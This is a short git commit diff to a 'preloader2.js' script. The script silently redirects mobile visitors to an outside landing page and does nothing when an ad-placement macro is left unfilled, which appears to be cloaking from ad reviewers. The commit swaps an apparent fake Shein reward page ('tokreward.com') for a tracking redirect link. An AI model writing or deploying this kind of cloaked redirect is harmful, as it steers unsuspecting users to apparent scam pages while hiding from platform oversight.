a54b5d8af362f252422229cb7f1ef699683b22ae
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-24 20:48:57 -0400

    Update preloader2.js

--- public/cdn/preloader2.js
+++ public/cdn/preloader2.js
@@ -2,7 +2,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const utmXXX = urlParams.get("xxx");
 const s = urlParams.get("s");
 const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-const lander = `https://tokreward.com/sheinesp.html?slug=${s}`;
+const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
 if (utmXXX === "__PLACEMENT__") { }
 else if (isMobileDevice) { window.location.href = lander; } 
 else { }
